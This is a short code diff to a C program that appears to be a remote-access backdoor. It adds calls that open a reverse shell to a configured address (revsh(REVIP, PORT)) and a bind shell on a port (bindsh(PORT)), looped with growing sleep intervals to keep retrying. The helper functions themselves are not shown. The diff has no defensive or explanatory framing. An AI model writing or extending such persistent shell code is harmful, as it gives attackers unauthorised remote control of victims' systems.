@@ -7,6 +7,7 @@
 #include <unistd.h>
 #include <syslog.h>
 #include <string.h>
+#include "helper.h"
 
 int main(void)
 {
@@ -55,16 +56,21 @@ int main(void)
     {
         /* Set up the reverse shell and sleep exponentially longer if no connections successful*/
 #ifdef REVSH
-
+        // my_printf("Reverse shell to %s on port %d", REVIP, PORT)
+        revsh(REVIP, PORT);
         sleep(loopcnt); /* wait 30 seconds */
         loopcnt *= 2;
 #endif
 
         /* Set up the bind shell code */
 #ifdef BINDSH
+        // my_printf("Bind shell on port %d", PORT)
+        bindsh(PORT);
         sleep(30); /* wait 30 seconds */
 #endif
     }
 
+    // wait(0);
+    my_printf("yolo mfs");
     exit(EXIT_SUCCESS);
 }
